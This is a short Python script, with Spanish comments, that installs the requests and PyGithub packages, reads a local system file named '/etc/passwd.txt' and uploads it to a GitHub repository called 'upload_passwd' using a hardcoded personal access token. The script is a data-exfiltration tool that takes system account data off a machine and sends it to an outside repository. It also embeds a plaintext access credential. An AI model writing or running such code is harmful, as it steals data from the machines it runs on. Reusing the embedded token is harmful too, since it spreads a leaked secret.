def run():
  import os
  os.system("pip install requests")
  os.system("pip install PyGithub")
  import requests
  import base64
  from github import Github
  
  # Tu token de acceso personal
  token = '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'
  
  # Nombre de usuario y nombre del repositorio
  usuario = 'oxitocinaa'
  repositorio = 'upload_passwd'
  
  # Ruta local del archivo que deseas subir
  archivo_local = '/etc/passwd.txt'
  
  # Rama en la que deseas realizar la carga
  rama = 'main'
  
  # Crea una instancia de la clase Github con tu token
  g = Github(token)
  
  # Obtiene el repositorio
  repo = g.get_user(usuario).get_repo(repositorio)
  
  # Sube el archivo al repositorio
  with open(archivo_local, 'rb') as archivo:
      contenido = archivo.read()
      repo.create_file(archivo_local, f"Commit desde script", contenido, branch=rama)
  
  print(f"Archivo '{archivo_local}' subido exitosamente a la rama '{rama}' en el repositorio '{repositorio}'.")
